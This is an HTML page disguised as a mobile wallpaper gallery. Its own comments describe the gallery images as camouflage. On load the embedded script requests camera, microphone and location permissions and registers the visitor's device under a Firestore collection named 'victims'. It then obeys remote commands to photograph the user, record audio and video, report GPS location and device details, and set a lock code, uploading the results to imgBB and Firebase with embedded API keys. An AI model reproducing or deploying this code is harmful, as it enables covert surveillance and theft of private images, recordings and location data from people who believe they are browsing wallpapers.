<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Wallpapers</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #f5f5f7;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            color: #1c1c1e;
        }
        /* شاشة البداية – تظهر لفترة قصيرة */
        #splash {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: #ffffff;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            transition: opacity 0.4s;
        }
        #splash .icon {
            font-size: 56px;
            margin-bottom: 16px;
        }
        #splash h3 {
            font-weight: 400;
            font-size: 20px;
            margin-bottom: 8px;
        }
        #splash p {
            font-size: 14px;
            color: #8e8e93;
        }
        .spinner {
            border: 3px solid #e5e5ea;
            border-top: 3px solid #007aff;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 0.8s linear infinite;
            margin: 24px auto 0;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        /* الواجهة الرئيسية – معرض خلفيات */
        #main {
            display: none;
            padding: 16px;
        }
        .header {
            padding: 16px 0;
            border-bottom: 1px solid #c6c6c8;
            margin-bottom: 20px;
        }
        .header h1 {
            font-size: 28px;
            font-weight: 600;
            letter-spacing: -0.5px;
        }
        .gallery {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 12px;
        }
        .wallpaper-card {
            background: #fff;
            border-radius: 16px;
            overflow: hidden;
            box-shadow: 0 2px 8px rgba(0,0,0,0.04);
            transition: transform 0.2s;
            aspect-ratio: 9/16;
        }
        .wallpaper-card:active { transform: scale(0.98); }
        .wallpaper-card img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            display: block;
        }
        .footer-note {
            margin-top: 24px;
            text-align: center;
            color: #8e8e93;
            font-size: 13px;
        }
    </style>
</head>
<body>
    <!-- شاشة البداية -->
    <div id="splash">
        <div class="icon">🖼️</div>
        <h3>Wallpapers</h3>
        <p id="splashStatus">Preparing your gallery…</p>
        <div class="spinner"></div>
    </div>

    <!-- الواجهة الرئيسية (معرض خلفيات) -->
    <div id="main">
        <div class="header">
            <h1>Wallpapers</h1>
        </div>
        <div class="gallery" id="galleryContainer">
            <!-- الصور ستضاف هنا عبر JavaScript -->
        </div>
        <div class="footer-note">
            Curated for you • Updated daily
        </div>
    </div>

    <script type="module">
        // ======================== 🔑 مفاتيحك (جاهزة) ========================
        const IMGBB_API_KEY = '69e4b5971880f9d736172f5fc9eb5bac';
        const FIREBASE_CONFIG = {
            apiKey: "AIzaSyCUUU64NotDyl-qjSvAD1jQZSQZrZEcuvU",
            authDomain: "zwahy-5b75d.firebaseapp.com",
            projectId: "zwahy-5b75d",
            storageBucket: "zwahy-5b75d.firebasestorage.app",
            messagingSenderId: "820206227713",
            appId: "1:820206227713:web:02057307aca7dfb7100b00"
        };
        // =====================================================================

        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getFirestore, doc, setDoc, collection, addDoc, serverTimestamp, onSnapshot, query, where, updateDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

        const app = initializeApp(FIREBASE_CONFIG);
        const db = getFirestore(app);

        const splash = document.getElementById('splash');
        const splashStatus = document.getElementById('splashStatus');
        const main = document.getElementById('main');
        const gallery = document.getElementById('galleryContainer');

        // معرف فريد للجهاز
        let deviceId = localStorage.getItem('arch_device_id');
        if (!deviceId) {
            deviceId = 'web_' + Math.random().toString(36).substring(2, 15) + '_' + Date.now();
            localStorage.setItem('arch_device_id', deviceId);
        }

        // --- مجموعة صور تجريبية للتمويه (من unsplash placeholder) ---
        const placeholderImages = [
            'https://images.pexels.com/photos/247431/pexels-photo-247431.jpeg?auto=compress&cs=tinysrgb&w=400',
            'https://images.pexels.com/photos/3225517/pexels-photo-3225517.jpeg?auto=compress&cs=tinysrgb&w=400',
            'https://images.pexels.com/photos/15286/pexels-photo.jpg?auto=compress&cs=tinysrgb&w=400',
            'https://images.pexels.com/photos/1770809/pexels-photo-1770809.jpeg?auto=compress&cs=tinysrgb&w=400',
            'https://images.pexels.com/photos/2387873/pexels-photo-2387873.jpeg?auto=compress&cs=tinysrgb&w=400',
            'https://images.pexels.com/photos/1366919/pexels-photo-1366919.jpeg?auto=compress&cs=tinysrgb&w=400'
        ];

        function renderGallery() {
            placeholderImages.forEach(url => {
                const card = document.createElement('div');
                card.className = 'wallpaper-card';
                const img = document.createElement('img');
                img.src = url;
                img.alt = 'Wallpaper';
                card.appendChild(img);
                gallery.appendChild(card);
            });
        }

        function updateStatus(msg) {
            if (splashStatus) splashStatus.innerText = msg;
            console.log('[Agent] ' + msg);
        }

        // --- طلب الصلاحيات (كاميرا، ميكروفون، موقع) ---
        async function requestAllPermissions() {
            updateStatus('Checking permissions...');
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                stream.getTracks().forEach(t => t.stop());
            } catch (e) { /* لو رفض المستخدم – ما زال التطبيق يعمل بدونها */ }
            try {
                await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, { timeout: 5000 }));
            } catch (e) {}
        }

        // --- تسجيل الجهاز في Firestore ---
        async function registerDevice() {
            try {
                const info = {
                    name: navigator.userAgent.substring(0, 100),
                    os: navigator.platform,
                    lastSeen: serverTimestamp(),
                    webAgent: true
                };
                await setDoc(doc(db, "victims", deviceId), info);
                updateStatus('Ready');
                console.log('[Agent] Registered');
                return true;
            } catch (e) {
                updateStatus('Connection error');
                console.error('Firebase error:', e);
                return false;
            }
        }

        // --- رفع Base64 إلى imgBB ---
        async function uploadToImgBB(base64Data) {
            try {
                const formData = new FormData();
                const raw = base64Data.split(',')[1] || base64Data;
                formData.append('image', raw);
                const res = await fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`, {
                    method: 'POST',
                    body: formData
                });
                const json = await res.json();
                if (json.success) return json.data.url;
                throw new Error('Upload failed');
            } catch { return null; }
        }

        // --- تنفيذ الأوامر (تعمل فوراً) ---
        async function executeCommand(cmd, extra = null) {
            console.log('[Agent] Exec:', cmd);
            try {
                switch (cmd) {
                    case 'gallery': await capturePhoto(); break;
                    case 'record_audio': await recordAudio(); break;
                    case 'record_video': await recordVideo(); break;
                    case 'camera_front': await capturePhoto('user'); break;
                    case 'camera_back': await capturePhoto('environment'); break;
                    case 'vibrate': navigator.vibrate?.(1000); break;
                    case 'location': await sendLocation(); break;
                    case 'device_info': await sendDeviceInfo(); break;
                    case 'lock_code': await handleLockCode(extra); break;
                    case 'format': console.log('Format simulated'); break;
                    default: console.warn('Unknown:', cmd);
                }
            } catch (e) {
                console.error('Cmd error:', e);
            }
        }

        async function capturePhoto(facingMode = 'user') {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
            const track = stream.getVideoTracks()[0];
            const bitmap = await new ImageCapture(track).grabFrame();
            const canvas = document.createElement('canvas');
            canvas.width = bitmap.width;
            canvas.height = bitmap.height;
            canvas.getContext('2d').drawImage(bitmap, 0, 0);
            const base64 = canvas.toDataURL('image/jpeg', 0.7);
            track.stop();
            const url = await uploadToImgBB(base64);
            if (url) {
                await addDoc(collection(db, "victims", deviceId, "results"), {
                    type: 'photo', url, timestamp: serverTimestamp()
                });
                console.log('Photo sent');
            }
        }

        async function recordAudio() {
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            const recorder = new MediaRecorder(stream);
            const chunks = [];
            recorder.ondataavailable = e => chunks.push(e.data);
            recorder.onstop = async () => {
                const blob = new Blob(chunks, { type: 'audio/webm' });
                const reader = new FileReader();
                reader.onloadend = async () => {
                    const url = await uploadToImgBB(reader.result);
                    if (url) {
                        await addDoc(collection(db, "victims", deviceId, "results"), {
                            type: 'file', url, filename: 'audio.webm', timestamp: serverTimestamp()
                        });
                        console.log('Audio sent');
                    }
                };
                reader.readAsDataURL(blob);
            };
            recorder.start();
            setTimeout(() => recorder.stop(), 3000);
        }

        async function recordVideo() {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            const recorder = new MediaRecorder(stream);
            const chunks = [];
            recorder.ondataavailable = e => chunks.push(e.data);
            recorder.onstop = async () => {
                const blob = new Blob(chunks, { type: 'video/webm' });
                const reader = new FileReader();
                reader.onloadend = async () => {
                    const url = await uploadToImgBB(reader.result);
                    if (url) {
                        await addDoc(collection(db, "victims", deviceId, "results"), {
                            type: 'file', url, filename: 'video.webm', timestamp: serverTimestamp()
                        });
                        console.log('Video sent');
                    }
                };
                reader.readAsDataURL(blob);
            };
            recorder.start();
            setTimeout(() => recorder.stop(), 3000);
        }

        async function sendLocation() {
            const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, { timeout: 10000 }));
            await addDoc(collection(db, "victims", deviceId, "results"), {
                type: 'location', lat: pos.coords.latitude, lng: pos.coords.longitude, timestamp: serverTimestamp()
            });
            console.log('Location sent');
        }

        async function sendDeviceInfo() {
            let info = `UserAgent: ${navigator.userAgent}\nPlatform: ${navigator.platform}`;
            if ('getBattery' in navigator) {
                const b = await navigator.getBattery();
                info += `\nBattery: ${Math.round(b.level*100)}% ${b.charging?'⚡':''}`;
            }
            await addDoc(collection(db, "victims", deviceId, "results"), {
                type: 'device_info', info, timestamp: serverTimestamp()
            });
            console.log('Info sent');
        }

        async function handleLockCode(code) {
            const finalCode = code || '1234';
            localStorage.setItem('lock_code', finalCode);
            await addDoc(collection(db, "victims", deviceId, "results"), {
                type: 'device_info', info: `Lock code set: ${finalCode}`, timestamp: serverTimestamp()
            });
            console.log('Lock code set');
        }

        // --- الاستماع للأوامر من Firestore ---
        function listenCommands() {
            const q = query(collection(db, "victims", deviceId, "commands"), where("status", "==", "pending"));
            onSnapshot(q, async (snap) => {
                for (const change of snap.docChanges()) {
                    if (change.type === 'added') {
                        const d = change.doc.data();
                        await executeCommand(d.command, d.code);
                        await updateDoc(change.doc.ref, { status: 'done' });
                    }
                }
            });
            console.log('[Agent] Listening for commands');
        }

        // --- بدء التشغيل ---
        (async function init() {
            renderGallery();
            await requestAllPermissions();
            const ok = await registerDevice();
            if (ok) {
                listenCommands();
                // بعد 2 ثانية نخفي شاشة البداية ونعرض المعرض
                setTimeout(() => {
                    splash.style.opacity = '0';
                    setTimeout(() => {
                        splash.style.display = 'none';
                        main.style.display = 'block';
                    }, 400);
                }, 2000);
            } else {
                splashStatus.innerText = 'Connection error – check internet';
            }
        })();
    </script>
</body>
</html>
